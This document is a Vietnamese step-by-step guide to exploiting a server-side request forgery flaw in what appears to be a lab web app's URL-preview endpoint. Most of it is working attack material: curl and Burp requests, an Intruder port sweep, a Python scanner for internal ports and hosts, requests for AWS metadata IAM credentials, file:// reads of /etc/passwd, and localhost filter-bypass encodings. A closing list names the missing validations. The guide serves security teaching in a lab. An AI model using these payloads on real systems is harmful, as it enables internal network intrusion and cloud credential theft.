# Hướng dẫn khai thác SSRF

## Bước 1: Login để lấy JWT Token

```bash
curl -X POST http://localhost:8081/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"email\":\"abc@gmail.com\",\"password\":\"123\"}"
```

Hoặc dùng Burp Suite:
```
POST /auth/login HTTP/1.1
Host: localhost:8081
Content-Type: application/json

{
    "email": "abc@gmail.com",
    "password": "123"
}
```

Response sẽ trả về JWT token:
```json
{
    "result": {
        "jwt": "eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ...",
        "message": "Login successful"
    }
}
```

---

## Bước 2: Test SSRF với URL hợp lệ

```bash
curl -X POST http://localhost:8081/api/posts/preview-url ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer YOUR_JWT_TOKEN" ^
  -d "{\"url\":\"https://google.com\"}"
```

---

## Bước 3: Khai thác SSRF - Scan Internal Ports

### 3.1 Scan localhost ports

```bash
# Scan port 3306 (MySQL/MariaDB)
curl -X POST http://localhost:8081/api/posts/preview-url ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer YOUR_JWT_TOKEN" ^
  -d "{\"url\":\"http://127.0.0.1:3306\"}"

# Scan port 8080
curl -X POST http://localhost:8081/api/posts/preview-url ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer YOUR_JWT_TOKEN" ^
  -d "{\"url\":\"http://127.0.0.1:8080\"}"

# Scan port 22 (SSH)
curl -X POST http://localhost:8081/api/posts/preview-url ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer YOUR_JWT_TOKEN" ^
  -d "{\"url\":\"http://127.0.0.1:22\"}"
```

---

## Bước 4: Khai thác SSRF với Burp Suite

### 4.1 Bắt request Login
1. Mở Burp Suite
2. Bật Proxy Intercept
3. Login vào ứng dụng qua browser
4. Lấy JWT token từ response

### 4.2 Gửi SSRF request

```
POST /api/posts/preview-url HTTP/1.1
Host: localhost:8081
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ...
Content-Length: 33

{"url":"http://127.0.0.1:3306"}
```

### 4.3 Sử dụng Burp Intruder để scan ports

1. Send request to Intruder (Ctrl+I)
2. Position: `{"url":"http://127.0.0.1:§22§"}`
3. Payload type: Numbers
   - From: 1
   - To: 65535
   - Step: 1
4. Start attack
5. Phân tích response để identify open ports:
   - Response length khác nhau
   - Status code khác nhau
   - Error messages khác nhau

---

## Bước 5: Access Internal Services

### 5.1 Access Cloud Metadata (nếu chạy trên AWS/GCP/Azure)

```bash
# AWS Metadata
curl -X POST http://localhost:8081/api/posts/preview-url ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer YOUR_JWT_TOKEN" ^
  -d "{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"

# AWS IAM Credentials
curl -X POST http://localhost:8081/api/posts/preview-url ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer YOUR_JWT_TOKEN" ^
  -d "{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}"
```

### 5.2 Access Internal Network

```bash
# Scan dải IP internal 192.168.1.x
curl -X POST http://localhost:8081/api/posts/preview-url ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer YOUR_JWT_TOKEN" ^
  -d "{\"url\":\"http://192.168.1.1\"}"

# Access router admin
curl -X POST http://localhost:8081/api/posts/preview-url ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer YOUR_JWT_TOKEN" ^
  -d "{\"url\":\"http://192.168.1.1/admin\"}"
```

### 5.3 Read Local Files (nếu server support file://)

```bash
# Linux
curl -X POST http://localhost:8081/api/posts/preview-url ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer YOUR_JWT_TOKEN" ^
  -d "{\"url\":\"file:///etc/passwd\"}"

# Windows
curl -X POST http://localhost:8081/api/posts/preview-url ^
  -H "Content-Type: application/json" ^
  -H "Authorization: Bearer YOUR_JWT_TOKEN" ^
  -d "{\"url\":\"file:///C:/Windows/System32/drivers/etc/hosts\"}"
```

---

## Bước 6: Bypass Techniques

### 6.1 Sử dụng localhost alternatives

```bash
# localhost
curl ... -d "{\"url\":\"http://localhost:3306\"}"

# 127.0.0.1
curl ... -d "{\"url\":\"http://127.0.0.1:3306\"}"

# 0.0.0.0
curl ... -d "{\"url\":\"http://0.0.0.0:3306\"}"

# 127.1
curl ... -d "{\"url\":\"http://127.1:3306\"}"

# [::1] (IPv6)
curl ... -d "{\"url\":\"http://[::1]:3306\"}"
```

### 6.2 URL Encoding

```bash
# Encode @ symbol
curl ... -d "{\"url\":\"http://127.0.0.1%40google.com:3306\"}"

# Encode characters
curl ... -d "{\"url\":\"http://%31%32%37.%30.%30.%31:3306\"}"
```

---

## Bước 7: Python Script tự động scan

```python
import requests
import json

# Configuration
BASE_URL = "http://localhost:8081"
EMAIL = "abc@gmail.com"
PASSWORD = "123"

# Step 1: Login
print("[*] Logging in...")
login_response = requests.post(
    f"{BASE_URL}/auth/login",
    json={"email": EMAIL, "password": PASSWORD}
)
token = login_response.json()['result']['jwt']
print(f"[+] Got JWT token: {token[:50]}...")

# Step 2: SSRF Attack
headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

# Test SSRF
print("\n[*] Testing SSRF vulnerability...")

# Common ports to scan
common_ports = [
    22,    # SSH
    80,    # HTTP
    443,   # HTTPS
    3306,  # MySQL
    5432,  # PostgreSQL
    6379,  # Redis
    8080,  # HTTP Alt
    8443,  # HTTPS Alt
    9200,  # Elasticsearch
    27017  # MongoDB
]

print("\n[*] Scanning localhost ports...")
for port in common_ports:
    try:
        response = requests.post(
            f"{BASE_URL}/api/posts/preview-url",
            headers=headers,
            json={"url": f"http://127.0.0.1:{port}"},
            timeout=10
        )
        
        if response.status_code == 200:
            result = response.json()['result']
            status = result.get('statusCode', -1)
            desc = result.get('description', 'N/A')
            
            if status != -1 and "Connection refused" not in desc:
                print(f"[+] Port {port}: OPEN - Status: {status}")
            else:
                print(f"[-] Port {port}: CLOSED - {desc[:50]}")
    except Exception as e:
        print(f"[!] Port {port}: ERROR - {str(e)[:50]}")

# Test internal network
print("\n[*] Testing internal network access...")
internal_targets = [
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
]

for target in internal_targets:
    try:
        response = requests.post(
            f"{BASE_URL}/api/posts/preview-url",
            headers=headers,
            json={"url": target},
            timeout=10
        )
        
        if response.status_code == 200:
            result = response.json()['result']
            print(f"[+] {target}: {result.get('title', 'No title')[:50]}")
    except Exception as e:
        print(f"[!] {target}: {str(e)[:50]}")

print("\n[*] SSRF scan completed!")
```

---

## Bước 8: Check Logs

Sau khi khai thác, check logs để thấy SSRF attempts:

```bash
# Windows
type logs\security.log | findstr "URL Preview"

# Linux
grep "URL Preview" logs/security.log
```

Logs sẽ hiển thị:
```
2025-10-22 10:00:00 INFO  c.n.s.s.UrlPreviewServiceImplementation - URL Preview requested by user: abc@gmail.com - Target URL: http://127.0.0.1:3306
2025-10-22 10:00:01 ERROR c.n.s.s.UrlPreviewServiceImplementation - Failed to fetch URL - User: abc@gmail.com - URL: http://127.0.0.1:3306 - Error: Connection refused
```

---

## Impact của SSRF này:

1. ✅ **Port Scanning**: Scan internal network để tìm services
2. ✅ **Access Internal Services**: Truy cập database, cache, admin panels
3. ✅ **Cloud Metadata Access**: Lấy credentials từ AWS/GCP/Azure metadata
4. ✅ **Information Disclosure**: Error messages leak thông tin về network
5. ✅ **Bypass Firewall**: Sử dụng server làm proxy
6. ✅ **File Read**: Đọc local files (nếu support file://)

---

## Notes:

- Endpoint này **KHÔNG** validate URL đầu vào
- Không filter internal IPs
- Không block localhost/127.0.0.1
- Allow redirects (có thể exploit DNS rebinding)
- Error messages leak thông tin
- Đây là lỗ hổng **NGHIÊM TRỌNG** trong production

